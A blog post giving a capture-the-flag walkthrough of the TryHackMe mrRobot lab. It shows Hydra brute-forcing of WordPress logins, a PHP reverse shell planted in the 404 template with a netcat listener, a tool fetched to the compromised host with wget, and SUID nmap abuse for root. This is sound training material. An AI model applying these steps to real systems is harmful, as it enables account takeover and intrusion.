---
layout: post
title: "[THM] mrRobot writeup"
slug: "mrRobot"
date: "2023-03-01"
comments: false
categories:
  - hacking
tags:
  - ctf
  - write up
  - tryhackme
  - privilege escalation
  - bruteforcing
  - enumeration
---


This is my write up for the Tryhackme [mrRobot](https://tryhackme.com/room/mrrobot) CTF challenge. The CTF is of easy/medium difficulty but due to the involvement of some enumeration, it was time consuming. The task didn't involve much outside the box thinking and involved copy pasting some scripts and following instructions on [GTFObins](https://gtfobins.github.io).

![mrRobotBanner](/images/mrRobot/mrRobotBanner.png)

As always we are given an IP address and we just have to scan the ip using nmap. In CTFs, usually there is a http endpoint at port 80 and we can focus on the http port while our nmap scan is running in the backgroud. It is also the same in the case of this machine.

![mrRobotSite](/images/mrRobot/mrRobotSite.png)

Checking the ip address on the browser, we are greeted with a really cool terminal themed web environment where we can interact with the site by entering commands. Inspecting the source code and checking the network calls, we don't really find anything interesting. So lets shift our focus to the nmap scan that we ran.


Here is a snippet of our nmap scan.

```bash
> nmap -sV -sC 10.10.103.189-v

PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
|_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b

```

From our scan we can observe that port 80 (http) and 443 (https) are open. So our endpoint or point of entry must be tied to the web content.
Our next step is to enumerate the url and try to find directories or files. We will use [GoBuster](https://github.com/OJ/gobuster) and for our wordlists to enumerate we will use Discovery wordlist from [SecLists](https://github.com/danielmiessler/SecLists).

A snippet of our directory and files enumeration.

```bash
> gobuster dir -u http://10.10.103.189 -w /SecLists/Discovery/Web-content/common.txt
===============================================================
2023/03/01 21:34:50 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/0                    (Status: 301) [Size: 0] [--> http://10.10.103.189/0/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.103.189/Image/]
/admin                (Status: 301) [Size: 235] [--> http://10.10.103.189/admin/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.103.189/feed/atom/]
/audio                (Status: 301) [Size: 235] [--> http://10.10.103.189/audio/]
/blog                 (Status: 301) [Size: 234] [--> http://10.10.103.189/blog/]
/css                  (Status: 301) [Size: 233] [--> http://10.10.103.189/css/]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.103.189/wp-admin/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.103.189/feed/]
/image                (Status: 301) [Size: 0] [--> http://10.10.103.189/image/]
/images               (Status: 301) [Size: 236] [--> http://10.10.103.189/images/]
/index.html           (Status: 200) [Size: 1104]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.103.189/]
/js                   (Status: 301) [Size: 232] [--> http://10.10.103.189/js/]
/intro                (Status: 200) [Size: 516314]
/license              (Status: 200) [Size: 309]
/login                (Status: 302) [Size: 0] [--> http://10.10.103.189/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> http://10.10.103.189/]
/phpmyadmin           (Status: 403) [Size: 94]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.103.189/feed/rdf/]
/readme               (Status: 200) [Size: 64]
/render/https://www.google.com (Status: 301) [Size: 0] [--> http://10.10.103.189/render/https:/www.google.com]
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.103.189/feed/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.103.189/feed/]
/sitemap              (Status: 200) [Size: 0]
/sitemap.xml          (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 235] [--> http://10.10.103.189/video/]
/wp-admin             (Status: 301) [Size: 238] [--> http://10.10.103.189/wp-admin/]
/wp-content           (Status: 301) [Size: 240] [--> http://10.10.103.189/wp-content/]
/wp-includes          (Status: 301) [Size: 241] [--> http://10.10.103.189/wp-includes/]
/wp-config            (Status: 200) [Size: 0]
/wp-cron              (Status: 200) [Size: 0]
/wp-load              (Status: 200) [Size: 0]
/wp-links-opml        (Status: 200) [Size: 227]
/wp-login             (Status: 200) [Size: 2613]
/wp-mail              (Status: 500) [Size: 3064]
/wp-settings          (Status: 500) [Size: 0]
/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.103.189/wp-login.php?action=register]
/xmlrpc               (Status: 405) [Size: 42]
/xmlrpc.php           (Status: 405) [Size: 42]
Progress: 4713 / 4714 (99.98%)
===============================================================
2023/03/01 21:48:41 Finished

```

From our enumeration we can observe that the site uses wordpress since our login is redirected to /wp-login.php. We can check out the other files such as the /license, /readme, /sitemap and most importantly /robots.txt. 

In ```robots.txt``` we can find two interesting files.

```url
http://10.10.103.189/robots.txt

User-agent: *
fsocity.dic
key-1-of-3.txt
```

We have found the first key needed to solve our challenge. Lets retrieve the key and the other file.

```bash
url=http://10.10.103.189
wget $url/key-1-of-3.txt $url/fsocity.dic
ls
key-1-of-3.txt fsocity.dic

```

> cat key-1-of-3.txt ****************

Now that we have our first key, let analyse the second file downloaded. 
The second file ```fsocity.dic``` is a text file that contains a list of text, so most probably it's a wordlist.

```bash
cat fsocity.dic | wc -l
858160
```

There are a lot of lines and using sort we can see that there are also a lot of duplicates. So let us sort the list and remove all the duplicates and append the list in a new file.

```bash
sort fsocity.dic | uniq > new_list.txt
cat new_list | wc -l
11451
```

We have massively reduce our wordlist. Now let us find an endpoint to utilise the wordlist.
On our previous scan we have discovered that the site has a wordpress login. Let us try to login into the site using our wordlist. 

> Wordpress has a default feature that if not disabled shows different error message for correct and incorrect username. If a user exists and if password is incorrect then it gives a hint that the password for the user is wrong. We can leverage this feature to enumerate for users and usernames that exist.

![wordpress_login](/images/mrRobot/wordpress_login.png)

Trying ```admin``` as the username we get an invalid username, so let us enumerate the username to find a user for the site.
The site probably doesn't have any rate limiting so we can bruteforce the correct username using a tool like burp intruder or hydra.
Since I only have the community version of burp it would probably be too slow to find the username, so Hydra it is.

Here is a good explanation of using Hydra for [bruteforcing website](https://theblackthreat.medium.com/brute-force-login-using-hydra-4ad7ddf863f6).

```bash
> hydra -L new_list.txt -p password 10.10.103.189 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30 -vV

[DATA] attacking http-post-form://10.10.103.189:80/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 10.10.103.189 - login "Elliot" - pass "password" - 1 of 1 [child 0] (0/0)
[80][http-post-form] host: 10.10.103.189   login: Elliot   password: password
```
From our hydra enumeration, we find the user ```Elliot``` after about going through 5000 lines of the wordlist.
Now that we have the username, lets repeat the same process using our wordlist on the password field.

```bash
> hydra -l Elliot -P new_list.txt 10.10.103.189 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you" -t 30 -vV
```

After going through about 5000 lines again we get a hit on the password, i.e ```ER28–0652```.

Now we login to the site using the wordpress credentials we enumerated.

> Our goal after getting access to the wordpress is to establish a shell so that we can access the system and obtain the keys. One way to gain a reverse shell is to change the php code of the 404.php page and insert code that will connect to our system.

Here is the [php shell code](https://github.com/jbarcia/Web-Shells/blob/master/laudanum/wordpress/templates/php-reverse-shell.php).

Go to ```appearance>editor>404 Template``` and replace the content of the 404 page with the shell code.

A snippet of what the ```404.php``` should look like:

![404php](/images/mrRobot/404php.png)

Now update the 404.php page and start a netcat listener on your host system to wait for the connection from the shell.

```bash
> nc -lvnp 1337
listening on 0.0.0.0 1337
```

We can trigger the 404.php page by going to any non-existent page in the website.
Lets trigger the 404 by going to ```http://10.10.103.189/errorpage```

> We get a reverse connection to our netcat.

Let us spawn a more stable shell using python.

```bash
> python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux: cd /home
daemon@linux: ls
daemon@linux: robot
daemon@linux: ls -l
ls -l
total 8
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
```

We can see the second key ```key-2-of-3.txt``` in the robots home directory but since our current user is daemon, and since only the robot user has read access to it and we can't view the contents of the file. We can also see a ```password.raw-md5``` file and on inspecting the file we can see that it contains a md5 hash and it can be deduced that it is the hash of the password for the user robot.  We probably have to decode the hash and login to robot user and then read the second key.  

> Instead, let us download [linEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) which is a shell script that can enumerate and detect interesting files that can lead to privilege escalation. This script can detect easy privilege escalation vectors like SUID and other misconfigured permissions etc.

After downloading, let us start a python server on our localhost so that we can download the ```LinEnum.sh``` from our compromised shell.

```bash
python3 -m http.server 7575

```

Now on our reverse shell, let us move to the /tmp folder where we have read write access. Download the ```linEnum.sh``` from our python server and then set execute permission and then run the script.

```bash
daemon@linux:/home/robot$ cd /tmp
daemon@linux:/home/robot$ wget http://10.17.30.241:7575/linEnum.sh
daemon@linux:/home/robot$ chmod +x linEnum.sh
daemon@linux:/home/robot$ ./linEnum.sh

```

Here is the output of ```linEnum.sh``` with an interesting discovery.

![linEnum](/images/mrRobot/linEnum.png)

We can observe that the script found a possible SUID file in ```/usr/local/bin/nmap```. Let us try to gain root privilege using this file.

We can refer to [GTFObins/nmap](https://gtfobins.github.io/gtfobins/nmap/) to try to execute shell commands.

```bash
daemon@linux:/tmp$ /usr/local/bin/nmap --interactive
/usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
> whoami
root
```

> Voila! We now have root access to the server and can read the contents of any file.

After gaining root access, we can easily view the contents of both the keys.

```bash
daemon@linux:/tmp$ cd /home/robot
daemon@linux:/home/robot$ cat key-2-of-3.txt
daemon@linux:/home/robot$ *******************
daemon@linux:/home/robot$ cd /root
daemon@linux:/root$ cat key-3-of-3.txt
daemon@linux:/home/robot$ *******************
```

> That's it. Happy Hacking















